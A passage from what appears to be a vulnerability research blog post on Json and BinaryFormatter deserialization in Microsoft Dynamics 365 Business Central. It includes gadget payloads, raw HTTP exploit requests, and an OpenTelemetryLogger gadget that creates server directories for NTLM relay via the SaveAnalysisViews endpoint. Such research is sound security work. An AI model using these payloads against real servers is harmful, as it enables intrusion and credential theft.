    "FormOpenExceptionData": "AAEAAAD/////AQAAAAAAAAAMAgAAAGBNaWNyb3NvZnQuRHluYW1pY3MuTmF2LlR5cGVzLCBWZXJzaW9uPTIzLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAADpNaWNyb3NvZnQuRHluYW1pY3MuTmF2LlR5cGVzLkNvbW1hbmRMaW5lQXJndW1lbnRzRXhjZXB0aW9uGQAAAA9TdXBwcmVzc01lc3NhZ2UNRmF0YWxpdHlTY29wZQplcnJvckxldmVsC05hdlRlbmFudElkD2Vudmlyb25tZW50TmFtZQ9lbnZpcm9ubWVudFR5cGUTRGlhZ25vc3RpY3NTdXBwcmVzcxJEaWFnbm9zdGljc01lc3NhZ2UbVHJhbnNpZW50RGlhZ25vc3RpY3NNZXNzYWdlHVN1cHByZXNzRXhjZXB0aW9uQ3JlYXRlZEV2ZW50C2FsQ2FsbFN0YWNrFGRldGFpbGVkRXJyb3JNZXNzYWdlIUVuZ2xpc2hMYW5ndWFnZURpYWdub3N0aWNzTWVzc2FnZQlDbGFzc05hbWUHTWVzc2FnZQREYXRhDklubmVyRXhjZXB0aW9uB0hlbHBVUkwQU3RhY2tUcmFjZVN0cmluZxZSZW1vdGVTdGFja1RyYWNlU3RyaW5nEFJlbW90ZVN0YWNrSW5kZXgPRXhjZXB0aW9uTWV0aG9kB0hSZXN1bHQGU291cmNlDVdhdHNvbkJ1Y2tldHMABAACAgIAAgIAAgICAQEDAwEBAQABAAEHAUFNaWNyb3NvZnQuRHluYW1pY3MuTmF2LlR5cGVzLkV4Y2VwdGlvbnMuTmF2RXhjZXB0aW9uRmF0YWxpdHlTY29wZQIAAAAIAQHiAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkRpY3Rpb25hcnlgMltbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0QU3lzdGVtLkV4Y2VwdGlvbggIAgIAAAAABf3///9BTWljcm9zb2Z0LkR5bmFtaWNzLk5hdi5UeXBlcy5FeGNlcHRpb25zLk5hdkV4Y2VwdGlvbkZhdGFsaXR5U2NvcGUBAAAAB3ZhbHVlX18ACAIAAAAAAAAAAAAAAAoKCgAKCgAKCgoGBAAAADpNaWNyb3NvZnQuRHluYW1pY3MuTmF2LlR5cGVzLkNvbW1hbmRMaW5lQXJndW1lbnRzRXhjZXB0aW9uCgkFAAAACgoKCgAAAAAKABUTgAoKBAUAAADiAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkRpY3Rpb25hcnlgMltbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAAB1ZlcnNpb24IQ29tcGFyZXIISGFzaFNpemUNS2V5VmFsdWVQYWlycwADAAMIkgFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5HZW5lcmljRXF1YWxpdHlDb21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQjmAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLktleVZhbHVlUGFpcmAyW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXVtdAQAAAAkGAAAAAwAAAAkHAAAABAYAAACSAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkdlbmVyaWNFcXVhbGl0eUNvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAAAAAAcHAAAAAAEAAAABAAAAA+QBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuS2V5VmFsdWVQYWlyYDJbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBPj////kAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLktleVZhbHVlUGFpcmAyW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQIAAAADa2V5BXZhbHVlAQMQU3lzdGVtLkV4Y2VwdGlvbgYJAAAABHRlc3QJCgAAAAQKAAAAEFN5c3RlbS5FeGNlcHRpb24MAAAACUNsYXNzTmFtZQdNZXNzYWdlBERhdGEOSW5uZXJFeGNlcHRpb24HSGVscFVSTBBTdGFja1RyYWNlU3RyaW5nFlJlbW90ZVN0YWNrVHJhY2VTdHJpbmcQUmVtb3RlU3RhY2tJbmRleA9FeGNlcHRpb25NZXRob2QHSFJlc3VsdAZTb3VyY2UNV2F0c29uQnVja2V0cwEBAwMBAQEAAQABBx5TeXN0ZW0uQ29sbGVjdGlvbnMuSURpY3Rpb25hcnkQU3lzdGVtLkV4Y2VwdGlvbggIAgYLAAAAEFN5c3RlbS5FeGNlcHRpb24KCgoKCgoAAAAACgAVE4AKCgs=",
    "PersonalizationId": null,
    "IsResourceDefinedForm": false,
    "Timeout": 0,
    "FormUpdateRequest": 0,
    "SubFormUpdateRequests": null,
    "Changes": null,
    "PageCaption": null,
    "FormVariables": null,
    "AutoKeyValues": null,
    "RecordState": 0,
    "PendingBackgroundTasks": null,
    "ValidateRequired": true,
    "ClientRecordDraft": false,
    "RenamingMode": 0,
    "CurrentFilterGroup": 0,
    "IsSubFormUpdateRequest": false,
    "MoreDataInReadDirection": false,
    "MoreDataInOppositeDirection": false,
    "UpdatePropagation": false,
    "SubFormSelectionStates": null,
    "RecordTemporary": false,
    "DataSourceType": 0
  },
  "GetRowsRequest": null,
  "MaxRowCount": 0
}
```

Sending this to our test instance via POST to `http://localhost:7085/BC230/client/data/page`, the deserialization chain takes place as expected by hitting one of our former breakpoints at `System.Type Microsoft.Dynamics.Nav.Types.NavExceptionSerializationBinder::BindToType(System.String,System.String)`. Easy win, right? Now, let's get serious and copy some code from ysoserial.NET for a real RCE gadget: [TypeConfuseDelegate](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TypeConfuseDelegateGenerator.cs). Constructing an object which should give us some *calc* dance and then simply change to: `field.SetValue(navBaseException, new Dictionary<string, object>() { { "test", TypeConfuseDelegateGadget("calc") } });`.

Remember my introductory question "Sounds mysterious"? We're not targeting a .NET Framework application but .NET Core. Let me introduce you to the [BinaryFormatter Obsoletion Strategy](https://github.com/dotnet/designs/blob/main/accepted/2020/better-obsoletion/binaryformatter-obsoletion.md).

> As part of modernizing the .NET development stack and improving the overall health of the .NET ecosystem, it is time to sunset the BinaryFormatter type. BinaryFormatter is the mechanism by which many .NET applications find themselves exposed to critical security vulnerabilities, and its continued usage results in numerous such incidents every year across both first-party and third-party code.

Step by step, Microsoft began to phase out this Formatter by e.g. removing the `[Serializable]` attribute from important classes, classes we as exploiters often rely on. Serialization after the single line of code change hits us hard.

```
[+] Serializing
Unhandled exception. Newtonsoft.Json.JsonSerializationException: Error getting value from 'FormOpenExceptionData' on 'Microsoft.Dynamics.Nav.Types.NavRecordState'.
 ---> System.Runtime.Serialization.SerializationException: Type 'System.Collections.Generic.ComparisonComparer`1[[System.String, System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e]]' in Assembly 'System.Private.CoreLib, Version=6.0.0.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e' is not marked as serializable.
   at System.Runtime.Serialization.FormatterServices.InternalGetSerializableMembers(Type type)
   at System.Runtime.Serialization.FormatterServices.<>c.<GetSerializableMembers>b__5_0(MemberHolder mh)
   at System.Collections.Concurrent.ConcurrentDictionary`2.GetOrAdd(TKey key, Func`2 valueFactory)
   at System.Runtime.Serialization.FormatterServices.GetSerializableMembers(Type type, StreamingContext context)
   at System.Runtime.Serialization.Formatters.Binary.WriteObjectInfo.InitMemberInfo()
   at System.Runtime.Serialization.Formatters.Binary.WriteObjectInfo.InitSerialize(Object obj, ISurrogateSelector surrogateSelector, StreamingContext context, SerObjectInfoInit serObjectInfoInit, IFormatterConverter converter, ObjectWriter objectWriter, SerializationBinder binder)
   at System.Runtime.Serialization.Formatters.Binary.ObjectWriter.Write(WriteObjectInfo objectInfo, NameInfo memberNameInfo, NameInfo typeNameInfo)
   at System.Runtime.Serialization.Formatters.Binary.ObjectWriter.Serialize(Object graph, BinaryFormatterWriter serWriter)
   at System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.Serialize(Stream serializationStream, Object graph)
   at Microsoft.Dynamics.Nav.Common.ExceptionHandler.SerializeToByteArray(Exception value)
   ...
```

Comparing a [.NET Framework implementation](https://referencesource.microsoft.com/#mscorlib/system/collections/generic/comparer.cs,150) with a [.NET (Core) implementation](https://source.dot.net/#System.Private.CoreLib/src/libraries/System.Private.CoreLib/src/System/Collections/Generic/Comparer.cs,35) shows that the `[Serializable]` attribute was gone. This and similar patterns basically destroy all known gadgets from ysoserial.NET applied to .NET (Core) targets. This was also mentioned in [another great research paper](https://github.com/thezdi/presentations/blob/main/2023_Hexacon/whitepaper-net-deser.pdf) by [Piotr of ZDI](https://x.com/chudyPB/).

#### Returning To Json Deserialization

So back from `NavExceptionSerializationBinder` to `Microsoft.Dynamics.Nav.Types.NavSerializationBinder` because we already know this Binder is used during Json deserialization. Can we understand which controllers and methods are relevant without relying on Wireshark copy&paste methodology?

Let's use the dnSpy Analyzer again to search for callees of the SerializationBinder.

{:refdef: style="text-align: center;"}
![SerializationBinder Call Chain](/assets/images/dynamics/dynamicsbindercallchain.png)
{: refdef}

The `System.Void Microsoft.Dynamics.Nav.Service.AspNetCore.ClientHostStartup::ConfigureServices(Microsoft.Extensions.DependencyInjection.IServiceCollection)` method takes care of properly setting up routing tables, serialization settings (obviously!), MVC options and many more things.

```csharp
public void ConfigureServices(IServiceCollection services)
{
	services.AddSingleton(NavEnvironment.NavServiceProvider.Services.GetRequiredService<INSServiceFactory>()).AddMvc(delegate(MvcOptions o)
	{
		o.EnableEndpointRouting = false;
		o.Filters.Add<ClearTlsAttribute>();
		o.Filters.Add<NavDiagnosticsExceptionFilter>();
		o.Filters.Add<ClientServiceExceptionFilter>();
	}).AddNewtonsoftJson(delegate(MvcNewtonsoftJsonOptions o)
	{
		SharedJsonSettings.Setup(o.SerializerSettings);
	})
		.ConfigureApplicationPartManager(delegate(ApplicationPartManager a)
		{
			a.ApplicationParts.Clear();
			a.ApplicationParts.Add(new AssemblyPart(typeof(ClientHostStartup).Assembly));
			a.FeatureProviders.OfType<ControllerFeatureProvider>().ToList<ControllerFeatureProvider>().ForEach(delegate(ControllerFeatureProvider controllerFeatureProvider)
			{
				a.FeatureProviders.Remove(controllerFeatureProvider);
			});
			a.FeatureProviders.Add(new ClientControllerFeatureProvider()); // [5]
		})
		.SetCompatibilityVersion(CompatibilityVersion.Version_2_1);
		// [...snip...]
```

At [5] we see a constructor call of `Microsoft.Dynamics.Nav.Service.AspNetCore.ClientControllerFeatureProvider` which implements a method `System.Boolean Microsoft.Dynamics.Nav.Service.AspNetCore.ClientControllerFeatureProvider::IsController(System.Reflection.TypeInfo)`. This sounds like a good candidate to look for controller classes being part of the desired deserialization routines. So we've a bunch of potentially interesting controllers.

* `Microsoft.Dynamics.Nav.Service.AspNetCore.ClientMetadataController`
* `Microsoft.Dynamics.Nav.Service.AspNetCore.ClientMetadataController`
* `Microsoft.Dynamics.Nav.Service.AspNetCore.WebSocketController`
* `Microsoft.Dynamics.Nav.Service.AspNetCore.UploadDownloadController`
* `Microsoft.Dynamics.Nav.Service.AspNetCore.MediaController`
* `Microsoft.Dynamics.Nav.Service.AspNetCore.UrlMediaController`

We find expected .NET attribute classes which confirm that these are indeed controller classes.

```csharp
[SessionId]
[MetadataToken]
[PermissionToken]
[ApiController] // <---
[ClientOperationBehavior(SessionUsage.UseCurrentSession, RunInTransaction = true, RetryAfterTransientError = true, TelemetryCategory = Category.Metadata)]
[Route("metadata")] // <---
public class ClientMetadataController : ServiceOperationController, IClientMetadataApi
// [...snip...]
```

#### Meeting Again SessionIdAttribute

We also meet again our `Microsoft.Dynamics.Nav.Service.AspNetCore.Filters.SessionIdAttribute` which takes care of proper session handling.

```csharp
internal sealed class SessionIdAttribute : ActionFilterAttribute
{
	// Token: 0x060001B9 RID: 441 RVA: 0x00007574 File Offset: 0x00005774
	public override void OnActionExecuting(ActionExecutingContext actionContext)
	{
		HttpRequest request = actionContext.HttpContext.Request;
		string sessionId;
		string text;
		if (!request.TryGetHeader("server-tenant-id", out text) || !request.TryGetHeader("server-session-id", out sessionId) || string.IsNullOrEmpty(sessionId))
		{
			actionContext.Result = new ObjectResult("Missing headers")
			{
				StatusCode = new int?(401)
			};
			return;
		}
		NavTenant navTenant;
		if (!NavEnvironment.Instance.Tenants.TryGetTenantById(text, out navTenant, false, false, false))
		{
			actionContext.Result = new ObjectResult("No tenant")
			{
				StatusCode = new int?(401)
			};
			return;
		}
		NavSession navSession = navTenant.ActiveSessions.FirstOrDefault((NavSession s) => s.ExternalId == sessionId);
		if (navSession == null)
		{
			actionContext.Result = new ObjectResult("No session")
			{
				StatusCode = new int?(401)
			};
			return;
		}
		actionContext.HttpContext.SetNavSession(navSession);
		NavCurrentThread.Session = navSession;
		base.OnActionExecuting(actionContext);
	}
	// [...snip...]
```

This class checks if e.g. header values such as `server-session-id` are set, otherwise the request is rejected and a response with status code 401 is returned. Indeed, if we send a request without session information, the response says:

```
HTTP/1.1 401 Unauthorized
Content-Type: text/plain; charset=utf-8
Server: Microsoft-HTTPAPI/2.0
request-id: e4c88f20-cb7d-49e2-977a-aa312b6d4fb6
WWW-Authenticate: Negotiate
Date: Thu, 13 Jun 2024 20:07:55 GMT
Connection: close
Content-Length: 15

Missing headers
```

This could all become an additional problem, if we want to sip the drink of unauthenticated preconditions. But let's look further into the deserialization parts first. 

#### Hitting Json Deserialization

So we know about controllers, let's choose one randomly: `Microsoft.Dynamics.Nav.Service.AspNetCore.UrlMediaController`.
We simply target the first API method implementation.

```csharp
[ApiController]
[ClientOperationBehavior(SessionUsage.None, TelemetryCategory = Category.Media)]
[Route("urimedia")] // <---
public class UrlMediaController : ServiceOperationController
{
	// Token: 0x060000AE RID: 174 RVA: 0x00004B08 File Offset: 0x00002D08
	[HttpGet] // <---
	public Task<IActionResult> GetUriMedia([FromBody] NavUriMedia uri) // <---
	{
		Uri validUri = null;
		return base.InvokeOperation<IActionResult>(delegate(ServiceOperationContext context)
		{
			if (Uri.TryCreate(uri.Uri, UriKind.RelativeOrAbsolute, out validUri))
			{
				NavUrlAccessibleMedia urlMedia = NavMediaLinkHelper.GetUrlAccessibleMediaByUri(validUri);
				return new FileStreamResult(new ChunkedMemoryStream(urlMedia.Content), urlMedia.MimeType).WithHeaders(delegate(IHeaderDictionary headers)
				{
					headers["x-file-name"] = urlMedia.FileName;
				});
			}
			return this.StatusCode(500);
		});
	}
	// [...snip...]
```

The relevant parts to derive a proper request are marked above. Let's add a breakpoint at `System.Type Microsoft.Dynamics.Nav.Types.NavSerializationBinder::BindToType(System.String,System.String)` and send our first request. Surprised by a GET request with a body? [Don't be](https://datatracker.ietf.org/doc/html/rfc7231#autoid-34).

```
GET /BC230/client/urimedia HTTP/1.1
Host: localhost:7085
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://localhost:8080/BC230/?startTraceId=01984f95587e4d9ea092ed26a48b2cd6&tid=&runinframe=1
[SESSION_STUFF]
Content-Type: application/json
Content-Length: 6

{}
-------------------
HTTP/1.1 500 Internal Server Error
Content-Type: application/problem+json; charset=utf-8
Server: Microsoft-HTTPAPI/2.0
request-id: 392cf8bc-c0d0-44c7-8201-6b942bd85e23
Date: Thu, 13 Jun 2024 20:17:19 GMT
Connection: close
Content-Length: 200

{"type":"https://tools.ietf.org/html/rfc7231#section-6.6.1","title":"An error occurred while processing your request.","status":500,"traceId":"00-a3551cff86ad51b73f90cae527017691-5f2e03be1d77c15d-01"}
```

Not what we expected but wait...nothing to deserialize here, so let's try a random (typed) serialized Json payload from our collection over the years.

```
GET /BC230/client/urimedia HTTP/1.1
Host: localhost:7085
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://localhost:8080/BC230/?startTraceId=01984f95587e4d9ea092ed26a48b2cd6&tid=&runinframe=1
[SESSION_STUFF]
Content-Type: application/json
Content-Length: 209

{"$type":"System.Configuration.Install.AssemblyInstaller,
System.Configuration.Install, Version=4.0.0.0, Culture=neutral,
PublicKeyToken=b03f5f7f11d50a3a",
"Path":"file:///c:/somePath/MixedLibrary.dll"}
-------------------
HTTP/1.1 400 Bad Request
Content-Type: application/problem+json; charset=utf-8
Server: Microsoft-HTTPAPI/2.0
request-id: 3bccb077-5186-4176-812a-4b7604c94464
Date: Thu, 13 Jun 2024 20:17:09 GMT
Connection: close
Content-Length: 441

{"errors":{"$type":["Error resolving type specified in Json 'System.Configuration.Install.AssemblyInstaller,\r\nSystem.Configuration.Install, Version=4.0.0.0, Culture=neutral,\r\nPublicKeyToken=b03f5f7f11d50a3a'. Path '$type', line 3, position 32."]},"type":"https://tools.ietf.org/html/rfc7231#section-6.5.1","title":"One or more validation errors occurred.","status":400,"traceId":"00-ec2642f1bc7465bfa8445ecf200b7b98-4b02f4d7ad8373ed-01"}
```

Alright, the type `AssemblyInstaller` was not found but what's more satisfying: we hit our breakpoint in `NavSerializationBinder`. We're on the right track. Looking back to our chapter "Hunting for Json Deserialization", we already analyzed the allow list contents defined through .NET type namespaces: *ProductAssemblies, KnownRelatedTypes and NetStandardAssembly*. Until now, I couldn't find any SerializationBinder bypasses, so the allow list holds as requirement.

In "Hunting for Json Deserialization" I also mentioned a few outstanding research references on Json deserialization. We learn from them that Json serializers use various algorithms trying to reconstruct an object from a serialized representation. Calling constructors are used a lot by gadget re*search*ers but also Setters. Of course there are more variants but we'll focus on the most successful methods so far. I actually did some deep-dive into the Newtonsoft Json serializer and was surprised how flexible, creative and powerful it is. Just one example which I didn't know (and hear about) before: the deserialization processor could utilize a parameterized constructor to create the object with one or few predefined fields from the serialization stream. If there are more fields, not being part of a constructor definition, it searches for Setters additionally.

> **Advice #13**: From time to time it's a good idea to make a deep-dive into 3rd party library code bases. For a better understanding of its inner workings, but also to strengthen your knowledge base.

And now the pain begins: searching for a gadget with could pass the SerializationBinder based on members of the allow list.
You could now go through the classes of each namespace in dnSpy.

{:refdef: style="text-align: center;"}
![Namespace Search](/assets/images/dynamics/dynamicsnamespacesearch.png)
{: refdef}

In every class, you're looking for "interesting" behavior in constructors and Setters. This can be a demotivating, stressful and long journey. 

The first interesting gadget which I found was in exactly this namespace shown in the screenshot above. It is based on the class ``Microsoft.BusinessCentral.Telemetry.OpenTelemetry.OpenTelemetryLogger`1``. The constructor looks like this:

```csharp
public OpenTelemetryLogger(Dictionary<string, object> contextColumns, string logFileFolderOnlyUseDuringDevelopment = null, bool enableLoggingToEventLog = false, LogLevel minimumLogLevel = LogLevel.Information)
{
	string tableName = LogDefinitionReflector.GetTelemetryTableNameFromCustomAttribute(typeof(TLogDefinition));
	Dictionary<string, object> finalContextColumns = OpenTelemetryLogger<TLogDefinition>.GetFinalContextColumns(contextColumns);
	Action<GenevaExporterOptions> <>9__2;
	Action<FileExporterOptions> <>9__3;
	Action<OpenTelemetryLoggerOptions> <>9__1;
	this.loggerFactory = LoggerFactory.Create(delegate(ILoggingBuilder builder)
	{
		ILoggingBuilder loggingBuilder = builder.SetMinimumLevel(minimumLogLevel);
		Action<OpenTelemetryLoggerOptions> action;
		if ((action = <>9__1) == null)
		{
			action = (<>9__1 = delegate(OpenTelemetryLoggerOptions loggerOptions)
			{
				Action<GenevaExporterOptions> action2;
				if ((action2 = <>9__2) == null)
				{
					action2 = (<>9__2 = delegate(GenevaExporterOptions options)
					{
						options.ConnectionString = "EtwSession=Microsoft.Dynamics.BusinessCentral.OpenTelemetry";
						options.PrepopulatedFields = finalContextColumns;
						Dictionary<string, string> dictionary = new Dictionary<string, string>();
						dictionary["*"] = tableName;
						options.TableNameMappings = dictionary;
					});
				}
				loggerOptions.AddGenevaLogExporter(action2);
				if (!string.IsNullOrWhiteSpace(logFileFolderOnlyUseDuringDevelopment)) 
				{
					Action<FileExporterOptions> action3;
					if ((action3 = <>9__3) == null)
					{
						action3 = (<>9__3 = delegate(FileExporterOptions options)
						{
							options.FilePath = Path.Combine(logFileFolderOnlyUseDuringDevelopment, tableName + ".tsv"); // [6]
							options.PrepopulatedFields = finalContextColumns;
						});
					}
					loggerOptions.AddFileExporter(action3); // [7]
				}
				// [...snip...]
```

The code line marked with [6] caught my attention quickly because we see a `Path.Combine` call with a controllable parameter `logFileFolderOnlyUseDuringDevelopment`. So what happens to the concatenated path in `System.String Microsoft.BusinessCentral.Telemetry.OpenTelemetry.FileExporter.FileExporterOptions::FilePath()`? At [7] ``OpenTelemetry.Logs.OpenTelemetryLoggerOptions Microsoft.BusinessCentral.Telemetry.OpenTelemetry.FileExporter.FileExporterExtensions::AddFileExporter(OpenTelemetry.Logs.OpenTelemetryLoggerOptions,System.Action`1<Microsoft.BusinessCentral.Telemetry.OpenTelemetry.FileExporter.FileExporterOptions>)`` is called. 

To be fair, that's not *really* true because the call hierarchy is a lot more complex then that.

{:refdef: style="text-align: center;"}
![Gadget Call Stack](/assets/images/dynamics/dynamicsgadgetcallstack.png)
{: refdef}

But that would unnecessarily complicate relevant parts of our explanations, so we proceed with a simplified description.

```csharp
public static OpenTelemetryLoggerOptions AddFileExporter(this OpenTelemetryLoggerOptions loggerOptions, Action<FileExporterOptions> configure = null)
{
	FileExporterOptions fileExporterOptions = new FileExporterOptions();
	if (configure != null)
	{
		configure(fileExporterOptions);
	}
	return loggerOptions.AddProcessor(new SimpleLogRecordExportProcessor(new LogFileExporter(fileExporterOptions))); // [8]
}
```

The `fileExporterOptions` variable holds the file path and is further processed in the constructor call at [8] by `System.Void Microsoft.BusinessCentral.Telemetry.OpenTelemetry.FileExporter.LogFileExporter::.ctor(Microsoft.BusinessCentral.Telemetry.OpenTelemetry.FileExporter.FileExporterOptions)`. The base class call in its constructor leads us to ``Microsoft.BusinessCentral.Telemetry.OpenTelemetry.FileExporter.BaseFileExporter`1``.

```csharp
protected BaseFileExporter(FileExporterOptions options)
{
	if (options == null)
	{
		throw new ArgumentNullException("options");
	}
	this.options = options;
	this.CreateDirectoryForFilePathIfNecessary(); // [9]
}
```

Then at [9] the method ``System.Void Microsoft.BusinessCentral.Telemetry.OpenTelemetry.FileExporter.BaseFileExporter`1::CreateDirectoryForFilePathIfNecessary()`` sounds promising.

```csharp
private void CreateDirectoryForFilePathIfNecessary()
{
	try
	{
		string directoryName = Path.GetDirectoryName(this.options.FilePath);
		if (!Directory.Exists(directoryName))
		{
			Directory.CreateDirectory(directoryName);
		}
	}
	catch (Exception ex)
	{
		throw new ArgumentException("Invalid file path: " + ex.Message, ex);
	}
}
```

And indeed, our `options.FilePath` leads to a `System.Boolean System.IO.Directory::Exists(System.String)` and eventually a `System.IO.DirectoryInfo System.IO.Directory::CreateDirectory(System.String)` call. This would be a pretty nice proof-of-concept because one could create directories on server-side and use UNC paths to enable NTLM Relay attacks, respectively. For a Json serializer, it is possible to write down the gadget by hand if one knows the structural definitions. Otherwise, you might write a few lines of code easily to get this:

```json
{
	"$type":".Microsoft.BusinessCentral.Telemetry.OpenTelemetry.OpenTelemetryLogger`1[[Microsoft.BusinessCentral.Telemetry.OpenTelemetry.LogDefinitions.Log, Microsoft.BusinessCentral.Telemetry.OpenTelemetry]], Microsoft.BusinessCentral.Telemetry.OpenTelemetry, Version=8.1.23275.1, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
	"contextColumns":{
		"$type":"System.Collections.Generic.Dictionary`2[[System.String, System.Private.CoreLib],[System.Object, System.Private.CoreLib]], System.Private.CoreLib","test":"whatever"
	},
	"logFileFolderOnlyUseDuringDevelopment":"C:\\Users\\Public\\Foobar\\test.txt"
}
```

So now we're ready to deliver this to an endpoint, shall we?


#### Finding the Entrypoint

We found a gadget, so just an entrypoint is missing where we're able to deliver the payload. Why an entrypoint, you might ask? We already know how to hit the Json deserialization: sending a GET to `/BC230/client/urimedia` with a Json body. Well, I didn't test this but I know why. Let's do it anyways for this blog post only. What do you see after sending the request? Any new directories created?
If I'm not sure were to put a breakpoint first for error analysis, dnSpy gives you an easy way to catch all exceptions at once.

{:refdef: style="text-align: center;"}
![Create Directory PoC](/assets/images/dynamics/dynamicsgeallexceptions.png)
{: refdef}

Firing the request again, gets you some hits. First, in my case passing `System.Type Microsoft.Dynamics.Nav.Types.NavSerializationBinder::BindToType(System.String,System.String)`, if you still had this breakpoint active.
Then, Json serializer code: `System.Void Newtonsoft.Json.Serialization.JsonSerializerInternalReader::ResolveTypeName(Newtonsoft.Json.JsonReader,System.Type&,Newtonsoft.Json.Serialization.JsonContract&,Newtonsoft.Json.Serialization.JsonProperty,Newtonsoft.Json.Serialization.JsonContainerContract,Newtonsoft.Json.Serialization.JsonProperty,System.String)` with the following exception variable content.

```
$exception	{Newtonsoft.Json.JsonSerializationException: Type specified in Json 'Microsoft.BusinessCentral.Telemetry.OpenTelemetry.OpenTelemetryLogger`1[[Microsoft.BusinessCentral.Telemetry.OpenTelemetry.LogDefinitions.Log, Microsoft.BusinessCentral.Telemetry.OpenTelemetry, Version=8.1.23275.1, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], Microsoft.BusinessCentral.Telemetry.OpenTelemetry, Version=8.1.23275.1, Culture=neutral, PublicKeyToken=31bf3856ad364e35' is not compatible with 'Microsoft.Dynamics.Nav.Types.Media.NavUriMedia, Microsoft.Dynamics.Nav.Types, Version=23.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'. Path '$type', line 2, position 328.
   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.ResolveTypeName(JsonReader reader, Type& objectType, JsonContract& contract, JsonProperty member, JsonContainerContract containerContract, JsonProperty containerMember, String qualifiedTypeName)}	Newtonsoft.Json.JsonSerializationException
```

Right, the method's parameter type is not compatible with the one delivered. So we need a method with a *generic type* (or an exact match). Our known list of controllers, we learnt earlier, still has some alternatives left. We land at the controller class `Microsoft.Dynamics.Nav.Service.AspNetCore.ClientMetadataController`. A lot of methods are implemented but this one is a gift.

```csharp
[HttpPost]
[Route("analysis/views/{pageId:int}")]
public async Task SaveAnalysisViews(int pageId, [FromBody] object views) // [10]
{
	await base.InvokeOperation(delegate(ServiceOperationContext context)
	{
		int pageId2 = pageId;
		object views2 = views;
		AnalysisViewHelper.SaveAnalysisViews(pageId2, ((views2 != null) ? views2.ToString() : null) ?? string.Empty);
	});
}
```

At [10] a method parameter `views` of type `System.Object` is used.

> Supports all classes in the .NET class hierarchy and provides low-level services to derived classes. This is the ultimate base class of all .NET classes; it is the root of the type hierarchy.

We provide an Integer in the URI path and deliver our Json payload in the body, as indicated by the `Microsoft.AspNetCore.Mvc.FromBodyAttribute`.

{:refdef: style="text-align: center;"}
![Create Directory PoC](/assets/images/dynamics/filecreator.gif)
{: refdef}

There are other gadgets like this in other variants, happy searching!


#### Can I Haz Auth Flaw Plz?

One thing is left: we need a valid session to call this controller, don't we?

```csharp
[SessionId] // <---
[MetadataToken] // <---
[PermissionToken] // <---
[ApiController]
